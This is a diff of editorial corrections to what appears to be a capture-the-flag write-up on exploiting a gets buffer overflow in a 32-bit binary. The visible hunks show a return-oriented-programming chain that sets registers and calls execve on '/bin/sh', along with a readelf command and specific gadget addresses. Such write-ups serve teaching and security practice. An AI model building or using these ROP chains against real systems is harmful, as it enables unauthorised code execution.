@@ -8,7 +8,7 @@
 
 We are given the source of a vulnerable program, as well as the binary:
 
-> ```C
+> ```c
 >#include <stdio.h>
 >#include <stdlib.h>
 >#include <string.h>
@@ -64,11 +64,11 @@ To obtain the expected setting, we will push the values onto the stack and then 
 * fill the buffer
 * @gadget(pop eax; ret)
 * 11
-* @gadget(pop ebx)
+* @gadget(pop ebx; ret)
 * @"/bin/sh"
-* @gadget(pop ecx)
+* @gadget(pop ecx; ret)
 * 0
-* @gadget(pop edx)
+* @gadget(pop edx; ret)
 * 0
 * interrupt
 
@@ -76,8 +76,8 @@ Indeed, these values will be placed on the top of the stack as `vuln` ends, that
 
 ### Address of "/bin/sh"
 
-"/bin/sh" doesn't appear in all program, and we have to find a way to execute the expected command. To get around the problem, we decided to create our own command
-and to use a constant string if `rodata`:
+"/bin/sh" doesn't appear in the program, and we have to find a way to execute the expected command. To get around the problem, we decided to create our own command
+and to use a constant string in `rodata`:
 
 > ```sh
 >% readelf -x .rodata ./gets|head -n 20
@@ -158,7 +158,7 @@ Gadget `pop $edx`: **0x0806f02a**
 
 Gadget `pop $edx`: **0x0806f630**
 
-And finally, the payload become:
+And finally, the payload becomes:
 
 * 0x080b81c6 ;pop eax
 * 0x0000000b ;execve syscall
